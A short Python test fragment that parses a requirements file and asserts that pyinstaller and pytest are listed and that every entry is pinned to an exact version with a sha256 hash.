    logical = re.sub(r"\\\n\s*", " ", text)     # join "\"-continued lines
    reqs = [ln for ln in logical.splitlines() if ln.strip() and not ln.lstrip().startswith("#")]
    assert {r.split("==")[0] for r in reqs} >= {"pyinstaller", "pytest"}
    for r in reqs:
        assert re.match(r"^[A-Za-z0-9_.-]+==[^\s]+ ", r), f"not pinned exactly: {r}"
        assert re.search(r"--hash=sha256:[0-9a-f]{64}", r), f"no hash: {r}"
